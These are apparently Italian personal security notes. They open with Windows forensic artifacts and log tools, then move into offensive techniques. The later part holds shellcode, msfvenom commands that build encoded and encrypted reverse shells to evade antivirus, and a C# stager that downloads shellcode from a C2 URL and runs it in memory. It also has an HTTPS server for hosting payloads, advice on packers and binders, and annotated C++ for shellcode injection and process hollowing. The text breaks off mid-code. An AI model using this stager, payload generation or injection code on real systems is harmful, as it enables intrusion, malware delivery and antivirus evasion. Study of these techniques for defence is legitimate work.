_Nei registri alle seguenti path __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"__ e __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"__ possiamo ricavare le path ricercate dall'utente_

- _File prefetch:_

_Quando un programma in windows viene avviato crea i file __"prefetch"__, file che raccolgono informazioni per usi futuri tipo caricare l'eseguibile in maniera più rapida; ritornano utili nella forense perchè registrano quante volte l'eseguibile viene aperto, quali file e handle sono utilizzati dall'eseguibile stesso e il tempo dell'ultimo utilizzo_

_Come al solito Eric Zimmerman metta a disposizione un tool chiamato [PECmd.exe](https://ericzimmerman.github.io/#!index.md) che serve a parsare e in seguito vedere i dati dei file .pf_

_Comandi:_
```cmd
PECmd.exe -f <path per i file prefetch> --csv <path per salvare il .csv> #comando per estrarre i dati dai file .pf e salvarli in un .csv
```
```cmd 
PECmd.exe -d <path per la cartella> --csv <path per salvare il .csv> #comando per estrarre i dati da una cartella e salvarli in un .csv
``` 

- _Cestino:_

_Il cestino può essere un ottima fonte di informazioni per capire cosa è stato cancellato, lo si trova in __"C:\$Recycle.Bin"__, i file con __"$I######"__ contengono nome originale del file data di quando è stato cancellato mentre i file con __"$R######"__ contengono il contenuto.
Eric mette a disposizione un tool per visionarlo [RBCmd.exe](https://ericzimmerman.github.io/#!index.md)_

_File Cloud:_

_Possiamo reperire i dettagli degli account cloud di microsoft a questo percorso __"HKLM\AM\Domains\Account\Users\InternetUserName"__, InternetUserName contiene l'email dell'account_

##### Applicazioni:

- _UserAssist:_

_Windows tiene traccia delle applicazioni lanciate, il tempo trascorso, e il numero di volte aperto e lo fa per ragioni di statistica però a noi può tornare utile, infatti andando a questa path __"HKCU\\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\<GUID>\Count"__ è possibile visionarle_

- _ShimCache:_

_La ShimCache è un meccanismo che tiene traccia della compatibilità delle applicazioni con l'OS e quando queste vengono lanciate è possibile visionare le info a questa path __"HKLM\SYSTEM\urrentControlSet\Control\Session Manager\AppCompatCache"__ ma per avere una visione migliore dei dati possiamo utilizzare il tool __"[AppCompatCacheParser](https://ericzimmerman.github.io/#!index.md)"__ per creare il .csv con i dati ed infine visionarli con il tool __"[EZViewer](https://ericzimmerman.github.io/#!index.md)"___

_Comandi:_
```cmd
AppCompatCacheParser.exe --csv <file output> -f <path del registro SYSTEM> -c <controlset> #comando per creare il .csv
```      
- _AmCache:_

_AmCache è sempre ricollegabile a ShimCache, in quanto entrambi raccolgono dati sulle applicazioni però AmCache, inoltre immagazzina dati come: path, tempo di esecuzione, SHA1 hash dei programmi eseguiti ecc...
Possiamo visionarlo alle seguenti path __"C:\Windows\appcompat\Programs\Amcache.hve"__ dobve è il file .hve e se utilizziamo Registry explorer troviamo l'ultimi programmi eseguiti a questa path __"Amcache.hve\Root\File\<Volume GUID>\"___

- _BAM/DAM:_

_BAM è il background activity monitor, colui che monitora le applicazioni in background mentre DAM è Desktop Activity Moderator colui addetto all'ottimizzazione dei consumi del device, entrambi i meccanismi tengono conto delle informazioni riguardanti le ultime applicazioni runnate e possiamo visionarle alle seguenti path __"HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\<SID>"__ e __"HKLM\SYSTEM\CurrentControlSet\Services\dam\UserSettings\<SID>"___

- _Windows 10 timeline:_

_Windows 10 registra le applicazioni utilizzate di recente in un sqlite database chiamato __"Windows 10 Timeline"__ e si trova alla seguente path __"C:\Users\<nome utente>\AppData\Local\ConnectedDevicesPlatform\<cartella casuale>ActivitiesCache.db"__ e tramite il tool [WxTCmd.exe](https://ericzimmerman.github.io/#!index.md) possiamo vederlo_

_Comandi:_
```cmd 
WxTCmd.exe -f <path al file timeline> --csv <path per salvare il csv> #comando che dato il file timeline estrae i dati e li salva in un .csv
```

- _Task Bar:_

_Possiamo reperire dal seguente registro __"HCKU\Software\CLASSES\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage"__ e più specificatamente alle due subkey __"AppLaunch (registra solo le applicazioni aggiunge alla taskbar)"__ e __AppSwitched (conta il numero  delle volte che l'utente interagisce con un'applicazione)__ le applicazioni con cui interagisce l'utente però vi sono delle limitazioni: il registro tiene conto solo dei software con GUI e non vi sono informazioni sul timestamp_

- _Windows jump lists:_

_le windows jump lists vennero introdotte per aiutare gli utenti ad accedere in maniera più diretta ai file utilizzati di recente è possibile visionarle alla seguente path __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"__, tramite il tool [JLECmd.exe](https://ericzimmerman.github.io/#!index.md)_

_Comandi:_
```cmd 
JLECmd.exe -f <path alla jumplist file> --csv <path per salvare il csv> #comando che prende i dati da un jumplist file e li salva in un .csv
``` 
- _Collegamenti:_

_I collegamenti, contengono informazioni sulla prima e ultima apertura di un file, la path del file o eseguibile ed è possibile visionarli alle seguenti path __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Recent\"__ e __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Office\Recent\"__ e come al solito abbiamo il tool per visionarlo il quale è [LECmd.exe](https://ericzimmerman.github.io/#!index.md)_

_Comandi:_
```cmd 
LECmd.exe -f <path agli shortcut file> --csv <path per salvare il .csv> #comando che dato uno shortcut file crea un .csv con i dati
``` 

- _MRU (Most Recent Used):_

_MRU tiene traccia delle applicazione utilizzate dall'utente e della posizione della cartella dell'ultimo file a cui l'applicazione ha acceduto è possibile visualizzarlo alla seguente path __HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU___

_Inoltre sempre tramite MRU è possibile tenere traccia dei file aperti o salvati all'interno di una finestra di dialogo, path: __"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU"___

- _CapabilityAccessManager:_

_Qui viene registrato l'uso del microfono, fotocamera e altre impostazioni, possiamo vederlo a queste path: __"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"__ e __"HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"___

##### Log:

_Il conoscere quali sono e dove andare a vederli è importante per avere un quadro generale su cosa è successo ad una macchina_

_Possiamo riconoscre i file di log perchè sono salvati con l'estensione __".evt"__ o __".evtx"__ e li troviamo tipicamente alla path __"C:\Windows\System32\winevt\Logs"___

- _Event Viewer:_

_event viewer è il software integrato in windows che permette la visione dei log, lo stesso software divide i log in diversi gruppi per semplificarne la ricerca e visualizzazione, le tipologia sono:_

1) Log di sistema = Log del sistema operativo windows

2) Log di sicurezza = Log inerenti al logon e logoff nel device o i diversi eventi di sicurezza

3) Log applicazioni = Log delle applicazioni quando vi sono eventi, crash o warnings

4) Directory Service Events = Log dell'Active Directory più specificatamente per i domain controller

5) Log di DNS = Log per gli eventi DNS

6) Log personalizzati = Log utilizzati dalle applicazioni che richiedono più memoria

- _wevtutil.exe:_

_wevtutil.exe o Windows Events Commandline Utility permette di automatizzare il processo di visionare le miriade di log presenti in un PC con diverse tipologia di comandi_

_Comandi:_
```cmd 
wevtutil.exe export-log <tipologia di eventi> <path dove salvare in .XML> #comando per esportare un file log
```
```cmd 
wevtutil.exe query-log <tipologia di eventi> --filter "<filtro query>" --output-format:xml #comando per fare una query su una tipologia di eventi
```
```cmd 
wevtutil.exe clear-log <tipologia di eventi> #comando che permette di ripulire una tipologia di eventi
```
```cmd 
wevtutil.exe get-log <tipologia di eventi> #comando per ottenere maggiori info su una tipologia di eventi
```
```cmd 
wevtutil.exe set-log <tipologia di eventi> /level:<tipologia di registrazione> /maxsize:<dimensione log> #comando che imposta alcune opzioni su una data tipologia di eventi
```
- _Get-WinEvent:_

_Comando powershell che permette di automatizzare il processo di visione dei log_

_Comandi:_
```powershell 
Get-WinEvent -ListLog * #comando che recupera tutti i log
```
```powershell 
Get-WinEvent -ListProvider * #comando che recupera i nome dei provider dei log
```
```powershell 
Get-WinEvent -LogName <nome> | Where-Object { $_.ProviderName -Match 'WSMan' } #comando che filtra i log
``` 
- _XPath:_

_XPath (XML Path Language) è un linguaggio per navigare ed interrogare i documenti scritti in XML_

_Quando si utilizza Event Viewer cliccando su evento, poi andando in dettagli e cliccando XML potremmo notare il medesimo evento scritto in XML e potrà essere utilizzato per le nostre XPath queries_

ES:
```xml 
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">  #Event o * indica l'inizio del XML
<System>  #campo utilizzato per il filtraggio dei parametri dentro System
<Provider Name="HP Comm Recovery" /> #campo per il filtraggio tramite nome del Provider Name
<EventID Qualifiers="0">1</EventID>  #campo per il filtraggio nel comando tramite il numero dell'event ID
<Version>0</Version> 
<Level>4</Level> 
<Task>0</Task> 
<Opcode>0</Opcode> 
<Keywords>0x80000000000000</Keywords> 
<TimeCreated SystemTime="2023-08-31T20:03:39.3352531Z" /> 
<EventRecordID>7684</EventRecordID> 
<Correlation /> 
<Execution ProcessID="5884" ThreadID="0" /> 
<Channel>Application</Channel> 
<Computer>alessandro</Computer> 
<Security /> 
</System>
<EventData> #campo utilizzato per il filtraggio dei parametri dentro EventData
<Data>Resume from Connected Standby</Data> 
</EventData>
</Event>`
``` 
_Comando esempio XPath dall'evento xml sopra:_
```powershell 
Get-WinEvent -LogName <tipologia nome evento> -FilterXPath '*/System/EventID=<num evento> or /Provider[@Name="<nome provider>"]'
```
_Un ottimo programma di logging è [Sysmon](./#sicurezza), preinstallato in windows_

##### Device Esterni:

- _USB:_

_Tramite i registri è possibile risalire a diverse informazioni inerenti i device USB alle seguenti path:_

1) HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR o \USB è possibile reperire ID vendor, ID prodotto, versione USB

2) SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USBSerial#\Properties\<id usb>\---- al posto dei __"----"__ possono esserci i numeri 0064 (Tempo prima connessione), 0066(tempo ultima connessione) e 0067 (tempo ultima rimozione)

3) HKLM\SOFTWARE\Microsoft\Windows Portable Devices\Devices qui possiamo trovare i nomi

_Possiamo reperire anche alla seguente path __"C:\Windows\inf\setupapi.dev.log"__ diverse informazioni sul device USB_
   
##### Tools:

_Parte fondamentale nella forense oltre a chi investiga, lo sono i tool quali:_

_Acquisizione:_

- [FTKImager](https://www.exterro.com/ftk-imager)

- [Autopsy](https://www.autopsy.com/)

_Generali:_

- [Tool Eric Zimmerman's](https://ericzimmerman.github.io/#!index.md)

- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape)

__N.B: I tool sviluppati da Eric Zimmerman's sono gratuiti e molto utili__

### Shellcode:

_Shellcode è un'insieme di istruzioni macchina volte nella maggior parte dei casi ad ottenere una shell privilegiata o una revshell, viene utilizzato in payload malevoli, in exploit e negli stessi malware._

- __Esempio di shellcode:__

_Il nostro primo shellcode, non è altro che una stringa che compare a schermo e poi esce dal programma_

_Codice:_
```asm 
global _start

section .text
_start:
jmp MESSAGE #inizio del programma che salta a message

GOBACK:
mov rax, 0x1 #istruzione che carica il valore 1 nel registro RAX (utilizzato per specificare le syscall) indicando write
mov rdi, 0x1 #istruzione che il valore 1 nel registro RDI (utilizzato per il file descriptor) 1 è uguale a quello di output
pop rsi  #istruzione che toglie l'indirizzo di goback e lo salva nel registro RSI
mov rdx, 0xd #istruzione che carica il valore 13 nel registro RDX (utilizzato per definire la lunghezza dei dati)
syscall #istruzione che effettua la syscall write

mov rax, 0x3c #istruzione che copia il valore 60 nel registro RAX (60 è uguale a exit)
mov rdi, 0x00 #istruzione che carica il valore 0 nel registro RDI che specifica l'uscita senza errori
syscall #istruzione che effetua la syscall exit

MESSAGE:
call GOBACK #chiamata alla funzione Goback quindi              
db "Hello World!", 0dh, 0ah #istruzione che definisce dei byte (define bytes) con la stringa 0dh = \r oah = \n
```
_Comandi:_
```bash 
nasm -f elf64 <nome script>asm #comando per compilare lo script
```
```bash 
ld <nome eseguibile>o -o <nome eseguibile> #comando per linkare e preparare l'eseguibile
```
```bash 
./<nome eseguibile> #comando per eseguirlo
```
```bash 
objcopy -j .text -O binary <nome eseguibile> <nome testo>.text #comando per estrarre .text section in binario
```
```bash 
xxd -i <nome testo>.text #comando per cambiare il binario in esadecimale
``` 
_Ora basterà prendere l'array di byte in C e inserirlo in un semplice programma per vedere che il tutto funzionerà_

- _Generazione di shellcode:_

_Esistono diversi C2 o lo stesso [metasploit](./#metasploit) che permettono di generare degli shellcode in maniera automatica_

_Comandi:_
```bash 
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c #comando che genera uno shellcode di una calcolatrice in C
```
```bash 
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw #comando che genera uno shellcode di una calcolatrice in formato raw
``` 
- _Stageless vs Staged:_

_Un payload stageless, significa che il payload stesso ha tutto in un solo eseguibile e quindi si avvierà subito_

_Vantaggi:_

1) Il payload verrà eseguito senza aprire ulteriori connessioni di rete quindi meno interazioni meno sono le possibilità di essere rilevati

2) Nel caso di internet lento non c'è problema, l'intero payload funzionerà da un solo eseguibile che si trova sulla macchina target.

_Un payload Staged invece all'inizio del attacco manda un piccolo eseguibile alla target machine in un secondo momento ricontatta il C2 che contine il resto da scaricare_

_Vantaggi:_

1) poche traccie sul disco in quanto abbiamo solo il payload inziale mentre il resto del payload va in RAM, andando in RAM quindi vi è meno probabilità di essere rintracciati da AV

2) si può riutilizzare lo stesso payload per altri attacchi

__N.B: Metasploit permette di crearli, per vedere come andare [qui](./#metasploit)__

- _Esempio di stager:_
```c++ 
using System;
using System.Net; 
using System.Text;
using System.Runtime.InteropServices;
using System.Configuration.Install
#importing delle librerie

public class program {
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
#codice per importare la funzione VirtualAlloc, serve a riservarci uno spazio di memoria per il nostro stager

[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref 
UInt32 lpThreadId);
#codice per importare la funzione CreateThread, serve a creare un thread per il nostro processo

[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
#codice per importare la funzione WaitForSingleObject, serve per la sincronizzazione tra thread

private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

WebClient wc = new WebClient(); #creazione dell'oggeto webclient che permette le connessione con il nostro C2
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; #comando per accettare il certificato self-signed
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; #comando che stabilisce il tipo di protocollo

public static void main(){
string url = "<url del C2>";
stager(); #comando per passare alla seconda funzione
}

public static void stager(){

byte[] shellcode = wc.DownloadData(url); #comando per fare il download dei dati passandogli l'url
UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
#comando che alloca memoria per il nostro shellcode

0 #indica l'indirizzo iniziale di memoria dove allocare lo shellcode, con 0 indica che SO può fare autonomamente
(UInt32)shellcode.Length #indica la grandezza di memoria d'allocare
MEM_COMMIT #indica di riservare della memoria
PAGE_EXECUTE_READWRITE #permessi di accesso alla memoria in questo caso execute read e write

Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length); #comando che copia il payload nella memoria allocata codeAddr

IntPtr threadHandle = IntPtr.Zero; #linea che inizializza una variabile di nome threadHandle, IntPtr.Zero rappresenta un handle dei thread
UInt32 threadId = 0; #identificatore del thread
IntPtr parameter = IntPtr.Zero; #parametro nullo
threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); #comando che crea un thread all'interno del processo corrente

0 = primo parametro indica un comportamento del thread ma a zero non succede nulla
0 = secondo parametro dimensione del thread ma a zero fa in automatico SO
codeAddr = terzo parametro che indica l'indirizzo dove è presente il codice del thread da eseguire
parameter = quarto parametro è vuoto
0 = quinto parametro che settato a 0 indica che il thread deve iniziare subito
threadId = sesto paramtro id del thread

WaitForSingleObject(threadHandle, 0xFFFFFFFF); #comando che segnala il periodo di attesa al programma

threadHandle = primo parametro che è l'handle influenzato
0xFFFFFFFF = secondo parametro periodo d'attesa che essendo a FFFFFFFF, il programma deve attendere finchè il thread non finisca
   }
}
```
_Comandi:_
```bash
openssl req -new -x509 -keyout <nome certificato>.pem -out localhost.pem -days 365 -nodes #comando per generare certificato ssl/tls
```
```bash
python3 -c "import http.server, ssl;server_address= ('<ip>',<porta>);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='<nome certificato>.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
#comando per avviare un python server con protocollo https è dove vi sarà il resto del payload
``` 
- _Encoding e Encryption:_

_Encoding e Encryption vengono applicate ad uno shellcode per obfuscarlo, in modo che non sia del tutto in chiaro e rilevabile dagli AV, [Metasploit](./#metasploit) mette a disposizione dei moduli per le 2 tecniche_

_Comandi:_
```bash
msfvenom --list encoders | grep excellent #comando per greppare gli encoders con rating excellent
```
```bash
msfvenom -a x86 --platform Windows LHOST=<ip> LPORT=<porta> -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
#comando per generare una revshell in C# encodato
```
```bash
msfvenom --list encrypt #comando per listare i vari metodi di encryption
```
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<porta> -f exe --encrypt xor --encrypt-key "<chiave decriptazione>" -o <nome 
eseguibile>.exe #comando che genera una revshell criptata
```
_Tool e link per deobfuscare:_

[PowerDecode](https://github.com/Malandrone/PowerDecode), tool per deobfuscare il powershell

- _Packers:_

_Il packing è utilizzato dagli sviluppatori per evitare che ad un loro programma venga fatto il reverse enginering e lo fanno tramite l'aggiunta di protezione contro il debbuging_

_Quando si fa il packing di un programma significa trasformarlo tramite una funzione in un packed, il nuovo packed conterrà il codice obfuscato, per poterlo recuperare va fatta l'operazione inversa con il packer utilizzato_

- _Struttura Packing:_

Applicazione----> packer che la impacchetta-----> Applicazione Packed con : entry point e PE header,
									    stub che contiene la funzione unpack(),
	     								    codice packed dell'applicazione
- _Struttura Unpacking:_

Applicazione Packed----> unpacker che legge il codice packed dell'applicazione-----> unpacker che runna il codice originale in RAM

- _Packing nel pratico:_

_In questo esempio utilizziamo il tool [ConfuserEx](https://mkaring.github.io/ConfuserEx/) per fare il packing di un nostro eseguibile_

_Comandi:_
```
Project-> selezioniamo la base directory e sempre sotto clicchiamo il + per aggiungere .exe-> settings tab-> clicchiamo il + e poi selezioniamo la voce packer enable compressor-> torniamo sulla rule facciamo edit e selezioniamo preset maximun-> tab protect e clicchiamo la voce protect #passi per fare il packing di un eseguibile
```
- _Software packing:_

_I software per il packing ne esistono molteplici tipo:_

1) [UPX](https://github.com/upx/upx/releases/tag/v4.1.0)

2) [ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0)

- _Binders:_

_I Binders è un'altro tipo di programma utilizzato per il bypassing dell'AV, il binding consiste nel legare insieme due eseguibili in un unico_

__N.B: i binders comunque non bypassano completamente l'AV perchè basta una firma nota che vengono bloccati, il loro potenziale consiste nel legare uno shellcode malevolo obfuscato o criptato, con un programma legittimo in modo di fregare un utente normale facendogli credere che sia un programma vero__

##### Tecniche di Injection:

__DISCLAIMER: Il codice presentato nella seguente sezione "Tecniche di Injection" non è funzionante dal momento che viene illustrato solo per capire e approfondire i concetti illustrati__

- __Shellcode Injection:__

_Shellcode injection consiste nell'aprire un processo, allocargli della memoria, scrivere il payload nella memoria allocata e tramite un thread remoto eseguirlo_

_Codice:_
```c++
processHandle = OpenProcess(
PROCESS_ALL_ACCESS, #campo che definische i diritti del processo
FALSE, #campo che imposta l'ereditarietà a false
DWORD(atoi(argv[1]))  #campo che passa il pid del processo tramite input dall'utente
);
```
```c++
remoteBuffer = VirtualAllocEx(
processHandle, #campo che apre il processo con l'handle
NULL, #campo che specifica l'indirizzo di partenza con il valore NULL è SO che quindi lo deciderà
sizeof shellcode, #grandezza da allocare per la memoria
(MEM_RESERVE | MEM_COMMIT), #campi che prima riservano la memoria e poi la rendono accessibile
PAGE_EXECUTE_READWRITE #campo che specifica i permessi quali lettura, scritture e esegui
);
```
```c++
WriteProcessMemory(
processHandle, #campo che passa l'handle
remoteBuffer, #campo che passa la memoria allocata
shellcode, #campo che indica lo shellcode da scrivere
sizeof shellcode, #campo che indica la grandezza
NULL
);
```
```c++
remoteThread = CreateRemoteThread(
processHandle, #campo che passa l'handle del processo
NULL, #campo per i permessi, con il valore NULL li eredita dal processo destinatario
0, #campo che indica la dimensione dello stack, con il valore 0 sarà SO a fare i calcoli
(LPTHREAD_START_ROUTINE)remoteBuffer, #campo con puntatore al punto di ingresso della memoria del thread
NULL, #campo che deve passare dei dati al thread, con il valore NULL non si passa nulla
0, #campo che fa runnare subito il thread
NULL
);
```
__N.B: le funzioni VirtualAlloc e VirtualAllocEx sono differenti per una cosa la prima riserva memoria per lo stesso processo mentre la seconda per un processo remoto__

- __Process Hollowing:__

_Il process hollowing molto simile allo shellcode injection solo che questa volta, possiamo fare in modo di injectare un intero file malevolo, il procedimento consiste: 

1) creare un processo in sospensione
   
2) aprire l'image del file malevolo

3) andare a togliere lo spazio di memoria allocata per il codice legittimo nel nostro processo vittima

4) allocare memoria per il codice malevolo e scrivere ogni sezione nello spazio di memoria

5) preparare il punto d'entrata per il codice malevolo

6) toglire il processo creato dalla sospensione

_Codice:_

_Passo 1_
```c++
LPSTARTUPINFOA target_si = new STARTUPINFOA(); #variabile che contiene informazioni sulla configurazione del processo
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); #variabile che da le informazioni sul processo e thread
CONTEXT c; #variabile che contiene il contenuto del thread

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", #campo che indica il nome dell'eseguibile che verrà avviato
	NULL, #campo che settato a NULL non passa argomenti
	NULL, #campo che settato a NULL non passa argomenti all'ambiente del processo
	NULL, #campo che setta la directory di lavoro sulla directory del processo corrente
	TRUE, #campo che indica che gli handles sono ereditati 
	CREATE_SUSPENDED, #campo che crea il processo in sospensione
	NULL, #campo che settato a NULL non passa nessuna variabile d'ambiente al processo figlio
	NULL, #campo che settato a NULL non specifica il nome
	target_si, #campo che indica il puntatore alla variabile target_s1
	target_pi) == 0) { 
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```
_Il passo 2 è diviso in tre step, il primo prendere l'handle dell'eseguibile malevolo, il secondo allocargli della memoria e il terzo è scrivere nello spazio di memoria allocato_

_Step 1:_
```c++
HANDLE hMaliciousCode = CreateFileA(
(LPCSTR)"C:\\\\Users\\\\alehelp\\\\malware.exe", #campo che apre un 'eseguibile di nome malware.exe
GENERIC_READ, #campo che indica la sola lettura
FILE_SHARE_READ, #campo che indica la condivisibilità del file in sola lettura da altri processi
NULL, #campo che settato a NULL non indica nessun attributo per il file
OPEN_EXISTING, #campo che indica che il file debba essere aperto solo se esista
NULL, #campo che settato a NULL non specifica nessun template per il file 
NULL #campo che settato a NULL nessun handle di sicurezza è specificato
);
```
 _Step2:_
```c++
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, #campo che passa l'handle del codice malevolo
	0 #campo che non ritorna errori
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL, #campo che se settato a NULL indica che SO deve scegliere l'indirizzo di base per la memoria virtuale
	maliciousFileSize, #campo che indica le dimensioni dell'eseguibile malevolo
	0x3000, #campo che indica il MEM_RESERVE cioè riservare un tot di memoria e il MEM_COMMIT cioè fare il commit con le pagine fisiche
	0x04 #campo che indica i diritti in questo caso lettura e scrittura
);
```
_Step 3:_
```c++
DWORD numberOfBytesRead; #variabile che registra i numeri di bytes letti

if (!ReadFile( #la funzione readfile, legge il contenuto dell'eseguibile e lo copia nella memoria allocata
	hMaliciousCode, #campo che indica l'handle dell'eseguibile malevolo
	pMaliciousImage, #campo che indica la memoria allocata
	maliciousFileSize, #campo che indica la dimensione dell'eseguibile malevolo
	&numberOfBytesRead, #campo che indica i numeri di bytes letti
	NULL #campo che settato a NULL non indica altri argomenti
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode); #chiusura dell'handle e vengono liberate le risorse
```
 _Il passo 3 richiede di andare a togliere lo spazio di memoria allocata per il processo, bisogna quindi capire dov'è in memoria e l'entry point, queste due informazioni sono contenute in 2 registri EAX (entry point) e EBX (Process Environment Block) infine dopo averli recuperati possiamo deallocare la memoria_
```c++
c.ContextFlags = CONTEXT_INTEGER; #variabile che indica quali registri includere nel contenuto del thread, in questo caso quelli di tipo intero
GetThreadContext(
	target_pi->hThread, #campo che prende l'handle del thread di destinazione
	&c #campo puntatore al contenuto del thread, dopo la chiamata alla funzione avraà il contenuto
);

PVOID pTargetImageBaseAddress; #puntatore che memorizza l'indirizzo base del processo
ReadProcessMemory(
	target_pi->hProcess,  #campo che prende l'handle del thread di destinazione
	(PVOID)(c.Ebx + 8), #campo che indica da dove iniziare la lettura della memoria cioè EBX + offset di 8 byte
	&pTargetImageBaseAddress,  #puntatore che memorizza l'indirizzo base del processo
	sizeof(PVOID), #campo che indica i bytes da leggere 
	0 #campo che indica i bytes letti
);

HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); #comando che ottiene l'handle della .dll ntdl
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress( #funzione che dealloca la memoria
	hNtdllBase, #campo che indica l'handle di ntdl
	"ZwUnmapViewOfSection" #campo che indica API call
); 

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi->hProcess,  #campo che prende l'handle del thread di destinazione
	pTargetImageBaseAddress #campo che indica l'indirizzo base del processo
);
```
_Il passo 4 richiede di allocare memoria per l'eseguibile malevolo e poi bisogna scrivere nella memoria allocata prima i PE headers e poi le sezioni_
```c++
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; #codice che inizializza un puntatore di tipo PIMAGE_DOS_HEADER e di valore 
pMaliciousImage, in modo da recuperare il DOS header dell'eseguibile malevolo

PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); #codice che inizializza un puntatore di tipo 
PIMAGE_NT_HEADERS, serve a recuperare l'header NT, viene sommato l'indirizzo dell'eseguibile più e_ifanew che contiene l'offset per l'header

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; #codice che ottiene la dimensione totale dell'immagine

PVOID pHollowAddress = VirtualAllocEx(
	target_pi->hProcess, #campo che prende l'handle del processo
	pTargetImageBaseAddress, #campo che contiene l'indirizzo base del processo
	sizeOfMaliciousImage, #campo che contiene la dimensione totale dell'eseguibile malevolo
	0x3000, #campo il cui valore 0x3000 corrisponde a MEM_RESERVE e MEM_COMMIT
	0x40 #campo che indica di attivare lettura e scrittura nella memoria virtuale

if (!WriteProcessMemory(
	target_pi->hProcess, #campo che prende l'handle del processo
	pTargetImageBaseAddress, #campo che contiene l'indirizzo base del processo
	pMaliciousImage, #campo che contiene il puntatore all'eseguibile
	pNTHeaders->OptionalHeader.SizeOfHeaders, #campo che indica la dimensione dei PE headers
	NULL
)) {
	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}

for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { #codice che itera per il numero di sezioni
PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
+ (i * sizeof(IMAGE_SECTION_HEADER))); 

#codice che determina le dimensione della sezione corrente l'operazione consiste: 
# la somma dell'indirizzo dell'eseguibile malevolo + l'offset dell'NT header per trovare l'indirizzo dell'header NT, 
# la somma della dimensione dell NT header cosi il puntatore punterà all'inizio del NT header 
# infine la somma dell'indice per la dimensione del NT header che ci permette di inviduare la sezione corrente

WriteProcessMemory(
	target_pi->hProcess,  #campo che prende l'handle del processo
	(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), #campo che contiene il l'indirizzo base del processo
	(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), #campo che contiene il puntatore al contenuto della sezione corrente
	pSectionHeader->SizeOfRawData, #campo che indica le dimensioni della sezione corrente
	NULL
 );
}
```
_Il passo 5 prevede di preparare il punto di entrata per il codice malevolo_
```c++
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); 
#codice che calcola l'indirizzo virtuale in cui il thread inizia l'esecuzione, i passaggi sono:
# indirizzo base delle memoria virtuale allocata 
# sommando poi l'indirizzo di entrata dell'immagine PE

SetThreadContext( #funzione che cambia il contenuto del thread corrente con il contenuto del thread salvato nella struttura c
	target_pi->hThread, #campo che indica l'handle del thread
	&c #campo che punta alla struttura contenente il contenuto
```
_Il passo 6 togliamo il processo dallo stato di sospensione_
```c++
ResumeThread(
	target_pi->hThread #campo che indica l'handle del thread
);
```
- __Thread Hijacking:__

_Nel Thread Hijacking i primi step sono uguali al Shellcode Injection, cioè prendere un processo, allocare memoria e scriverci il codice malevolo al suo interno_

_Codice:_
```c++
processHandle = OpenProcess(
PROCESS_ALL_ACCESS, #campo che definisce i diritti del processo
